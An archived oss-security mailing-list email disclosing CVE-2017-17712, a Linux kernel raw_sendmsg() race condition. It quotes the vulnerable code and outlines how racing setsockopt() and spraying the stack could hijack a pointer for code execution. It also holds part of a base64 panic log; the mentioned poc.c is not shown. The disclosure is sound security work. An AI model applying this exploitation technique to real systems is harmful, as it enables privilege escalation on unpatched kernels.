X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["31266" "Saturday" "16" "December" "2017" "00:29:09" "+0000" "Mohamed Ghannam" "simo.ghannam@gmail.com" "<CAP8jf_BKWuYGsqrNUCbJgCFUJv0nJvp+eiKEy3Ati0FYaCED0Q@mail.gmail.com>" "562" "[oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition" "^Date:" nil nil "12" "2017121600:29:09" "[oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition" (number mark "U       simo.ghannam Dec 16  562/31266 " thread-indent "\"[oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 18225 invoked by uid 550); 16 Dec 2017 02:24:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 1403 invoked from network); 16 Dec 2017 00:29:23 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=LEiiEBgmilFrBSm/sZPZ84sXIqlreOY9OHDx1U9SZHQ=;
        b=XNgvd8HAkg2x/a/Paq9WwydyZJMAtuhpvPwrX1nmO/IeIiLsDgxli7qbq44X5pGWdP
         YRKicmssbiYYgl2q5zCDtOhSzcrZWkHFa44JG8gQSIuRbILpyVHtu7O2FoCOMbhoNFSQ
         BsXpKlxnBH2iR2PM7IwK1316XBOb5l7eyX5jU3rf0nEhfvCvyNhKWgJ0aFimYabfb4bW
         zSHNB+HHdVsxXBiHBrzSj43ICmTkOKFdoZ1eEIEbjKgv7YSzw1XGEiTWn5ZDXAIgR7ez
         dbUZfIHb0W7SYD/yx5IxgG8b8l5f1xYPfcBl1+CPMr9KQee04555xjTgBtOc692lmdha
         3pmg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=LEiiEBgmilFrBSm/sZPZ84sXIqlreOY9OHDx1U9SZHQ=;
        b=CqC8JoQtYQNGyTfYUxA1NZJ6JPLOV927oNPh29XTCiI+wtE59GSztpdZ/VnvcLVweN
         CpoTpnxXMucVN8n/kG/LQusvP3L1uMUKT9P1AuUvDMw7i10k1S8SsQAavfKz0x/dwD/4
         8tyH9GqWEry0l2V7HY3NyzMIpEJMlfAW8BTCDNIJpjDDEjT3Nu2dmSy0J5SGMZvvFVnU
         OSD96tbNeyRALqDj4qcB1LBzwVM1uqYO3qHG59ZL5ze+cJCOX4wGdPR2gmWQhpDmEfY3
         gC5XoVsl44OQQ0zdccfmbmoX3oJBVYYod0zz8nk7iN8XIaAJnNvCkCoCYxVSnCPDLLit
         QoUg==
X-Gm-Message-State: AKGB3mLWeptT9mHZxr0Pva4Xy/dqpgAGaeRVf5xaFupqLSVZJbinVn0N
	iE0EXT5NPg1DpVz2AW6emfzddCZ3nM+0w4l16uUQ9MIs
X-Google-Smtp-Source: ACJfBovubxdPt0tcxoS2bSEbQFOmDhQeiisu9LrSk3Wg4YYJQ2irK4Avri5wy2PjmC0N3f6v+CdO/bJ4jg5C0dt/B/o=
X-Received: by 10.55.98.134 with SMTP id w128mr23055989qkb.292.1513384150791;
 Fri, 15 Dec 2017 16:29:10 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAP8jf_BKWuYGsqrNUCbJgCFUJv0nJvp+eiKEy3Ati0FYaCED0Q@mail.gmail.com>
Content-Type: multipart/mixed; boundary="001a11482b1cb7a18005606a34df"
Date: Sat, 16 Dec 2017 00:29:09 +0000
From: Mohamed Ghannam <simo.ghannam@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition
To: oss-security@lists.openwall.com

--001a11482b1cb7a18005606a34df
Content-Type: multipart/alternative; boundary="001a11482b1cb7a17d05606a34dd"

--001a11482b1cb7a17d05606a34dd
Content-Type: text/plain; charset="UTF-8"

Hi,


This is an announcement for CVE-2017-17712 which is a race condition leads
to uninitialized stack variable, this might be used to gain code execution.


The bug was introduced  here :
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c008ba5bdc9fa830e1a349b20b0be5a137bdef7a

And fixed here :
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8f659a03a0ba9289b9aeb9b4470e6fb263d6f483


#######   BUG DETAILS  ############


in net/ipv4/raw.c:

static int raw_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)

{

...

struct raw_frag_vec rfv;  [1]

...


...

if (!inet->hdrincl) {  [2]

rfv.msg = msg;

rfv.hlen = 0;


err = raw_probe_proto_opt(&rfv, &fl4);

if (err)

goto done;

}

...

...

if (inet->hdrincl)  [3]

err = raw_send_hdrinc(sk, &fl4, msg, len,

      &rt, msg->msg_flags, &ipc.sockc);


 else {

sock_tx_timestamp(sk, ipc.sockc.tsflags, &ipc.tx_flags);


if (!ipc.addr)

ipc.addr = fl4.daddr;

lock_sock(sk);

err = ip_append_data(sk, &fl4, raw_getfrag,

     &rfv, len, 0, [4]

     &ipc, &rt, msg->msg_flags);

...

}


[1] rfv is not initialized and contains a pointer to a msghdr header
structure.

[2], [3] There are multiple checks against inet->hdrincl without a lock.


When we achieve (by racing inet->hdrincl via setsockopt()) inet->hdrincl=1
in [1], and inet->hdrincl=0 in [2], rfv variable remains uninitialized and
used in [4].

By spraying the stack with controlled user data , we can take control of
msg pointer which is used later in ip_append_data().


In attachment  : poc.c + kernel panic log


#######   CREDITS  ############

Mohamed GHANNAM

--001a11482b1cb7a17d05606a34dd
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">







<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">Hi,</p><p class=3D"gmail-p1" style=3D"margin:0px;fon=
t-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-=
weight:normal;font-stretch:normal;font-size:12px;line-height:normal;font-fa=
mily:&quot;Helvetica Neue&quot;;color:rgb(69,69,69)"><br></p><p class=3D"gm=
ail-p1" style=3D"margin:0px;font-style:normal;font-variant-ligatures:normal=
;font-variant-caps:normal;font-weight:normal;font-stretch:normal;font-size:=
12px;line-height:normal;font-family:&quot;Helvetica Neue&quot;;color:rgb(69=
,69,69)">This is an announcement for CVE-2017-17712 which is a race conditi=
on leads to uninitialized stack variable,=C2=A0<span style=3D"font-size:12.=
8px;font-family:arial,sans-serif;color:rgb(34,34,34)">this might be used to=
 gain code execution.</span></p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p3" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(228,175,10)"><span class=3D"gmail-s1" style=3D"color:rgb(69,69,=
69)">The bug was introduced =C2=A0here :=C2=A0<a href=3D"https://git.kernel=
.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3Dc008ba5bdc9fa=
830e1a349b20b0be5a137bdef7a"><span class=3D"gmail-s2" style=3D"text-decorat=
ion:underline;color:rgb(228,175,10)">https://git.kernel.org/pub/scm/linux/k=
ernel/git/torvalds/linux.git/commit/?id=3Dc008ba5bdc9fa830e1a349b20b0be5a13=
7bdef7a</span></a></span></p>
<p class=3D"gmail-p3" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(228,175,10)"><span class=3D"gmail-s1" style=3D"color:rgb(69,69,=
69)">And fixed here : <a href=3D"https://git.kernel.org/pub/scm/linux/kerne=
l/git/torvalds/linux.git/commit/?id=3D8f659a03a0ba9289b9aeb9b4470e6fb263d6f=
483"><span class=3D"gmail-s3" style=3D"color:rgb(228,175,10)">https://git.k=
ernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3D8f659a03=
a0ba9289b9aeb9b4470e6fb263d6f483</span></a></span></p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">####### <span class=3D"gmail-Apple-converted-space">=
=C2=A0 </span>BUG DETAILS<span class=3D"gmail-Apple-converted-space">=C2=A0=
 </span>############</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">in net/ipv4/raw.c:</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">static int raw_sendmsg(struct sock *sk, struct msghd=
r *msg, size_t len)</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">{</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>...</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>struct raw_frag_vec rfv;=C2=A0<span class=3D"gmail-Apple=
-tab-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab=
-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-spa=
n" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" s=
tyle=3D"white-space:pre">	</span>[1]</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>...</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>...</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>if (!inet-&gt;hdrincl) {=C2=A0<span class=3D"gmail-Apple=
-tab-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab=
-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-spa=
n" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" s=
tyle=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=
=3D"white-space:pre">	</span>[2]</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>rfv.msg =3D msg;</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>rfv.hlen =3D 0;</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>err =3D raw_probe_proto_opt(&amp;rfv, &amp;fl4);</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>if (err)</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
e">	</span>goto done;</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>}</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>...</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><span class=3D"gmail-Apple-tab-span"=
 style=3D"white-space:pre">	</span></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>...</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>if (inet-&gt;hdrincl)=C2=A0<span class=3D"gmail-Apple-ta=
b-span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-sp=
an" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" =
style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" styl=
e=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D=
"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"whi=
te-space:pre">	</span>[3]</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>err =3D raw_send_hdrinc(sk, &amp;fl4, msg, len,</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
e">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">	=
</span>=C2=A0=C2=A0 =C2=A0 =C2=A0&amp;rt, msg-&gt;msg_flags, &amp;ipc.sockc=
);</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>=C2=A0else {</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>sock_tx_timestamp(sk, ipc.sockc.tsflags, &amp;ipc.tx_flags);=
</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>if (!ipc.addr)</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
e">	</span>ipc.addr =3D fl4.daddr;</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>lock_sock(sk);</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span>err =3D ip_append_data(sk, &amp;fl4, raw_getfrag,</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
e">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">	=
</span>=C2=A0=C2=A0 =C2=A0 &amp;rfv, len, 0,<span class=3D"gmail-Apple-tab-=
span" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span=
" style=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" st=
yle=3D"white-space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=
=3D"white-space:pre">	</span>[4]</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-spac=
e:pre">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pr=
e">	</span><span class=3D"gmail-Apple-tab-span" style=3D"white-space:pre">	=
</span>=C2=A0=C2=A0 =C2=A0 &amp;ipc, &amp;rt, msg-&gt;msg_flags);</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)"><span class=3D"gmail-Apple-tab-span" style=3D"white-=
space:pre">	</span>...</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">}</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">[1] rfv is not initialized and contains a pointer to=
 a msghdr header structure.</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">[2], [3] There are multiple checks against inet-&gt;=
hdrincl without a lock.</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">When we achieve (by racing inet-&gt;hdrincl via sets=
ockopt()) inet-&gt;hdrincl=3D1 in [1], and inet-&gt;hdrincl=3D0 in [2], rfv=
 variable remains uninitialized and used in [4].</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">By spraying the stack with controlled user data , we=
 can take control of msg pointer which is used later in ip_append_data().</=
p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">In attachment =C2=A0: poc.c + kernel panic log</p>
<p class=3D"gmail-p2" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69);min-height:14px"><br></p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">####### <span class=3D"gmail-Apple-converted-space">=
=C2=A0 </span>CREDITS<span class=3D"gmail-Apple-converted-space">=C2=A0 </s=
pan>############</p>
<p class=3D"gmail-p1" style=3D"margin:0px;font-style:normal;font-variant-li=
gatures:normal;font-variant-caps:normal;font-weight:normal;font-stretch:nor=
mal;font-size:12px;line-height:normal;font-family:&quot;Helvetica Neue&quot=
;;color:rgb(69,69,69)">Mohamed GHANNAM</p></div>

--001a11482b1cb7a17d05606a34dd--

--001a11482b1cb7a18005606a34df
Content-Type: application/octet-stream; name="panic.log"
Content-Disposition: attachment; filename="panic.log"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_jb8lswlh0

WyAgICAyLjc2Mjg0MV0gZ2VuZXJhbCBwcm90ZWN0aW9uIGZhdWx0OiAwMDAw
IFsjMV0gU01QClsgICAgMi43NjMxNzBdIE1vZHVsZXMgbGlua2VkIGluOgpb
ICAgIDIuNzYzMzM5XSBDUFU6IDMgUElEOiAzNDgyIENvbW06IGljbXAgTm90
IHRhaW50ZWQgNC4xNS4wLXJjMisgIzIxClsgICAgMi43NjM2NzhdIEhhcmR3
YXJlIG5hbWU6IFFFTVUgU3RhbmRhcmQgUEMgKGk0NDBGWCArIFBJSVgsIDE5
OTYpLCBCSU9TIFVidW50dS0xLjguMi0xdWJ1bnR1MSAwNC8wMS8yMDE0Clsg
